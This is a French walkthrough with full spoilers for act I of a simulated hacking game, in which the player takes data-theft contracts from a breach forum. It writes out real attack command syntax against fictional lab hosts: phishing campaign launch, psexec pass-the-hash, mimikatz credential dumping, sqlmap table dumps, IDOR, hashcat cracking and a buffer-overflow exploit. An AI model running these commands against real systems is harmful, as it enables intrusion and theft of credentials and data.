# Acte I — Se faire un nom

> Archive de la progression antérieure. Pour une nouvelle carrière 0.5.1, suivre [l’acte I actuel](ACTE_I_ACTUEL.md). Les passages remplacés restent utiles aux dossiers anciens déjà lancés.

Dix chapitres jouables ; les huit exercices privés et Ravelle forment le chapitre 1.
Les nouvelles carrières suivent cette progression (version 3). Les sauvegardes
anciennes conservent leurs accès et leurs dossiers validés.

La progression des aides et les réactions entre dossiers sont décrites dans
[ACTE_I_APPRENTISSAGE.md](ACTE_I_APPRENTISSAGE.md) (0.4.8).

## Où trouver les dossiers

BreachBoard → **Campagne** montre les dix chapitres et le prochain contact.
Le chapitre 2 est une annonce publique. Les chapitres 3, 9 et 10 arrivent dans
**Messages**, les MP du forum. Les chapitres 4 à 8 sont proposés par des contacts
sur Chordly. Les comptes rendus se font dans Chordly après acceptation.
La finale envoie une invitation dans les MP : il faut l’accepter, puis configurer
une route Tor pour consulter Exployt. L’accès NullVad de la boutique est gratuit.

## Contenu

| Chapitre | Dossier | Travail demandé |
|---|---|---|
| 1 | Sous recommandation | Exercices privés, Ravelle, accès à BreachBoard |
| 2 | Une porte oubliée | Partage SMB invité, permissions, version récente |
| 3 | Échantillon gratuit | Import SQL et requêtes groupées : prouver les dates réelles |
| 4 | Derrière la boutique | SQLmap : paramètre, base, tables, colonnes, export complet |
| 5 | Le carnet d’adresses | Session web, contrôle propriétaire et endpoint IDOR |
| 6 | Le mot de passe de trop | Hashcat, compte encore valable, SSH limité et SCP |
| 7 | Un service fragile | Service fictif, analyse guidée, Linux limité et SQL en lecture |
| 8 | Mauvaise adresse | Prouver l’homonymie, retrouver la cible, récupérer le vrai fichier |
| 9 | La réputation se paie | Comparer les preuves ; publication ou médiation privée |
| 10 | Quelqu’un répond de toi | Deux voies de livraison puis invitation en MP |

Le choix du chapitre 9 est persistant : la publication ajoute réellement les
preuves au fil ; la médiation conserve une confirmation privée. Les deux voies
finales utilisent les mêmes données et exigent le bon périmètre.

Huit petits contrats facultatifs se débloquent selon les compétences rencontrées :
tri d’export, contacts, dates, colonnes, logs, exposition HTTP, archive et empreinte
NTLM. Filtre dédié dans Contrats. Primes nettes de 30 à 70 ₵, paiement unique, sans forfait de route par petit contrat ; aucune
location GPU ni quête secondaire n’est nécessaire pour finir l’histoire.

## Durée et limites

**4 à 6 heures est une cible de conception non mesurée.** Les tests automatisés
prouvent les parcours et reprises, pas la durée d’apprentissage ni l’équilibrage.
La validation graphique humaine, le rythme, le son et les finitions restent ouverts.

Les outils sont simulés. SQLmap utilise les paramètres vulnérables déclarés et
les exports correspondent aux tables du dossier. Les requêtes tournent sur SQLite
en mémoire ; le client MySQL couvre un sous-ensemble du SQL de lecture. Le
laboratoire ticketd est un service et un build fictifs précis : les modèles GDB,
checksec et Python ne remplacent pas un émulateur CPU ou un interpréteur général.
Les archives possèdent un conteneur virtuel, avec liste, extraction et refus des
chemins dangereux. Aucun outil ne contacte le réseau extérieur au jeu.
Le petit dictionnaire de démonstration n’est pas rockyou complet et aucun hashrate
RTX 5090 mesuré n’est implémenté.

## Solutions — spoilers complets

Une commande à la fois dans les **terminaux du jeu**. Les lignes Forum se font dans
le navigateur ; les messages Chordly vont au client du dossier. « Session » désigne
une console distincte de Kali. Saisir les mots de passe seulement à leur invite.
Le [guide du prélude](PRELUDE_CHORDLY.md) explique les huit exercices du chapitre 1.

### 1. Sous recommandation

Contact : **k0rvid**.

Kali :

```text
nmap -sV 10.20.0.0/24
```

Kali :

```text
API_KEY=$(cat ~/gophish/api-key.txt)
```

Kali :

```text
curl -k -H "Authorization: $API_KEY" -H "Content-Type: application/json" -d @/home/operator/gophish/campaign.json https://127.0.0.1:3333/api/campaigns/
```

Session / deuxième console :

```text
impacket-psexec m.leroux:Password123!@10.20.0.21
```

Kali :

```text
smbclient //10.20.0.21/C$ -U m.leroux%Password123! -c "put /home/operator/tools/mimikatz.exe Tools/mimikatz.exe"
```

Session / deuxième console :

```text
C:\Tools\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
```

Kali :

```text
impacket-psexec -hashes :ca61eb63ab385fa4039002a79909c534 it.presta@10.20.0.10
```

### 2. Une porte oubliée

Contact : **k0rvid**.

Forum : ouvrir le fil `act1-partages` et lire les réponses.

Kali :

```text
nmap -sV 10.61.2.10
```

Kali :

```text
smbclient -L 10.61.2.10 -N
```

Kali :

```text
smbclient //10.61.2.10/public -N -c "ls"
```

Kali :

```text
smbclient //10.61.2.10/public -N -c "get courant/NC-26-041.txt /home/operator/loot/nacre.txt"
```

Kali :

```text
cat ~/loot/nacre.txt
```

Chordly : `livraison NC-26-041`.

### 3. Échantillon gratuit

Contact : **hexcache**.

Forum : ouvrir le fil `act1-echantillon-annonce` et lire les réponses.

Kali :

```text
cat ~/mission/annonce.txt
```

Kali :

```text
sqlite3 ~/loot/echantillon.db < ~/mission/echantillon.sql
```

Kali :

```text
sqlite3 ~/loot/echantillon.db ".tables"
```

Kali :

```text
sqlite3 ~/loot/echantillon.db ".schema clients"
```

Kali :

```text
sqlite3 ~/loot/echantillon.db "SELECT date, COUNT(*) FROM clients GROUP BY date;"
```

Chordly : `rapport NX-26 36 anciennes 4 recentes`.

### 4. Derrière la boutique

Contact : **hexcache**.

Forum : ouvrir le fil `act1-pivoine` et lire les réponses.

Kali :

```text
nmap -sV 10.61.4.20
```

Kali :

```text
curl http://10.61.4.20/
```

Kali :

```text
sqlmap -u "http://10.61.4.20/produit?id=1" -p id --batch --dbs
```

Kali :

```text
sqlmap -u "http://10.61.4.20/produit?id=1" -D pivoine --tables --batch
```

Kali :

```text
sqlmap -u "http://10.61.4.20/produit?id=1" -D pivoine -T commandes --columns --batch
```

Kali :

```text
sqlmap -u "http://10.61.4.20/produit?id=1" -D pivoine -T commandes --dump --batch --output-dir=/home/operator/loot/sqlmap
```

Kali :

```text
head -n 5 ~/loot/sqlmap/10.61.4.20/dump/pivoine/commandes.csv
```

Chordly : `livraison PV-26 commandes`.

### 5. Le carnet d’adresses

Contact : **0xvanta**.

Forum : ouvrir le fil `act1-verre` et lire les réponses.

Kali :

```text
cat ~/mission/acces-verre.txt
```

Kali :

```text
curl -H "Cookie: session=ambre-client" "http://10.61.5.20/api/document?id=102" > ~/loot/verre.csv
```

Kali :

```text
cat ~/loot/verre.csv
```

Chordly : `preuve VA-26-204 Orme`.

### 6. Le mot de passe de trop

Contact : **0xvanta**.

Kali :

```text
cat ~/mission/passation.txt
```

Kali :

```text
hashcat -m 1000 ~/mission/planning.ntlm ~/mission/mots.txt
```

Kali :

```text
hashcat -m 1000 --show ~/mission/planning.ntlm
```

Session / deuxième console :

```text
ssh planning@10.61.6.21
```

Session / deuxième console :

```text
Atelier2026!
```

Session / deuxième console :

```text
cat /home/planning/README.txt
```

Kali :

```text
scp planning@10.61.6.21:/srv/planning/OR-26-311.csv ~/loot/planning.csv
```

Kali :

```text
Atelier2026!
```

Kali :

```text
cat ~/loot/planning.csv
```

Chordly : `livraison OR-26-311`.

### 7. Un service fragile

Contact : **nullroute**.

Forum : ouvrir le fil `act1-ticketd` et lire les réponses.

Kali :

```text
cat ~/lab/README.txt
```

Kali :

```text
nmap -sV 10.61.7.30
```

Kali :

```text
nc -nv 10.61.7.30 5000
```

Kali :

```text
checksec --file=/home/operator/lab/ticketd
```

Kali :

```text
gdb -q /home/operator/lab/ticketd -ex "info functions" -ex quit
```

Session / deuxième console :

```text
python3 ~/lab/ticketd.py --host 10.61.7.30 --port 5000 --offset 72 --ret 0x4011d6
```

Session / deuxième console :

```text
whoami
```

Session / deuxième console :

```text
cat /home/svc.ticket/README.txt
```

Session / deuxième console :

```text
cat /etc/ticketd/database.ini
```

Kali :

```text
mysql -h 10.61.7.10 -u ticket_ro -p -D ticketing -e "SELECT * FROM tickets;" > ~/loot/tickets.tsv
```

Kali :

```text
TicketRead2026!
```

Kali :

```text
cat ~/loot/tickets.tsv
```

Chordly : `livraison TK-26 tickets`.

### 8. Mauvaise adresse

Contact : **nullroute**.

Kali :

```text
cat ~/mission/enquete.txt
```

Kali :

```text
curl http://10.48.1.20/mentions.txt
```

Forum : ouvrir le fil `aquila-homonymes` et lire les réponses.

Chordly : `Aquila Conseil et Aquila Fret sont distinctes : AF-26-118.`.

Forum : ouvrir le fil `aquila-portail` et lire les réponses.

Kali :

```text
curl http://10.48.8.31/mentions.txt
```

Chordly : `AQF-PORTAIL 10.48.8.31 AF-26-118`.

Kali :

```text
nmap -sV 10.48.8.31
```

Kali :

```text
curl http://10.48.8.31/robots.txt
```

Kali :

```text
curl http://10.48.8.31/exports/support.env.old > ~/loot/support.env
```

Kali :

```text
grep -n SSH ~/loot/support.env
```

Session / deuxième console :

```text
ssh svc.portail@10.48.8.31
```

Session / deuxième console :

```text
PortailFret2026!
```

Session / deuxième console :

```text
type C:\Users\svc.portail\Documents\reprise.txt
```

Session / deuxième console :

```text
type C:\Users\svc.portail\Documents\connecteur.ini
```

Kali :

```text
nmap -sV 10.48.8.0/24
```

Kali :

```text
smbclient //10.48.8.10/C$ -U svc.docs%DocsFret2026! -c "get Data/Livraisons/2026/AF-26-118.csv /home/operator/loot/livraison.csv"
```

Kali :

```text
head -n 4 ~/loot/livraison.csv
```

Chordly : `livraison AF-26-118`.

### 9. La réputation se paie

Contact : **bytewarden**.

Kali :

```text
cat ~/mission/litige.txt
```

Forum : ouvrir le fil `act1-litige` et lire les réponses.

Kali :

```text
sqlite3 ~/loot/litige.db < ~/mission/litige.sql
```

Kali :

```text
sqlite3 ~/loot/litige.db "SELECT source, reference, date FROM livraisons;"
```

Chordly : `publier dossier 118`.

Alternative : `mediation dossier 118` conserve les preuves en privé.
### 10. Quelqu’un répond de toi

Contact : **bytewarden**.

Forum : ouvrir le fil `act1-boreal` et lire les réponses.

Kali :

```text
nmap -sV 10.61.10.20
```

Kali :

```text
curl http://10.61.10.20/
```


**Voie sqlmap**

Kali :

```text
sqlmap -u "http://10.61.10.20/bordereau?id=1" --batch --dbs
```

Kali :

```text
sqlmap -u "http://10.61.10.20/bordereau?id=1" -D boreal -T bordereaux --dump --where="statut='valide'" --batch --output-dir=/home/operator/loot/sqlmap
```

Kali :

```text
cat ~/loot/sqlmap/10.61.10.20/dump/boreal/bordereaux.csv
```

Chordly : `livraison BR-26 sqlmap`.


**Voie connecteur**

Kali :

```text
curl http://10.61.10.20/robots.txt
```

Kali :

```text
curl http://10.61.10.20/support/database.env.old
```

Kali :

```text
mysql -h 10.61.10.10 -u boreal_ro -p -D boreal -e "SELECT * FROM bordereaux WHERE statut='valide';" > ~/loot/boreal.tsv
```

Kali :

```text
BorealRead2026!
```

Kali :

```text
cat ~/loot/boreal.tsv
```

Chordly : `livraison BR-26 connecteur`.

Ouvrir ensuite Messages dans BreachBoard et accepter l’invitation.

## Solutions des petits contrats

### [Petit boulot] Extraire les références

Lire `cat ~/mission/bon.txt` et `cat ~/mission/entree.txt`.

```text
cut -d ";" -f 1 ~/mission/entree.txt > ~/loot/resultat.txt
```

Puis envoyer `livraison colonnes` à miette.

### [Petit boulot] Sauvetage d’archive

Lire `cat ~/mission/bon.txt` et `cat ~/mission/entree.txt`.

```text
tar -tf ~/mission/lot.tar
tar -xf ~/mission/lot.tar -C ~/loot
cat ~/loot/courant/lot.txt
grep LOT-77 ~/loot/courant/lot.txt > ~/loot/resultat.txt
```

Puis envoyer `livraison comptage` à miette.

### [Petit boulot] Retrouver un contact

Lire `cat ~/mission/bon.txt` et `cat ~/mission/entree.txt`.

```text
grep nacre.test ~/mission/entree.txt > ~/loot/resultat.txt
```

Puis envoyer `livraison contacts` à miette.

### [Petit boulot] Écarter les anciennes lignes

Lire `cat ~/mission/bon.txt` et `cat ~/mission/entree.txt`.

```text
grep 2026 ~/mission/entree.txt > ~/loot/resultat.txt
```

Puis envoyer `livraison dates` à miette.

### [Petit boulot] Empreinte facile

Lire `cat ~/mission/bon.txt` et `cat ~/mission/entree.txt`.

```text
hashcat -m 1000 ~/mission/entree.txt ~/mission/candidats.txt
hashcat -m 1000 --show ~/mission/entree.txt > ~/loot/resultat.txt
```

Puis envoyer `livraison empreinte` à miette.

### [Petit boulot] Confirmer une exposition

Lire `cat ~/mission/bon.txt` et `cat ~/mission/entree.txt`.

```text
nmap -sV 10.62.1.20
curl http://10.62.1.20/ > ~/loot/resultat.txt
```

Puis envoyer `livraison inventaire` à miette.

### [Petit boulot] Retrouver une erreur datée

Lire `cat ~/mission/bon.txt` et `cat ~/mission/entree.txt`.

```text
grep -n ERROR ~/mission/entree.txt > ~/loot/resultat.txt
```

Puis envoyer `livraison logs` à miette.

### [Petit boulot] Nettoyer un export

Lire `cat ~/mission/bon.txt` et `cat ~/mission/entree.txt`.

```text
cat ~/mission/entree.txt | sort | uniq > ~/loot/resultat.txt
```

Puis envoyer `livraison tri` à miette.


## Dossier facultatif — Le contretemps (0.4.7)

Après Une porte oubliée, miette propose une enquête à deux sources et un choix
de transmission. Elle ne compte pas parmi les dix chapitres obligatoires.
Solution et conséquences : [DEMO_ET_CONTRETEMPS.md](DEMO_ET_CONTRETEMPS.md).
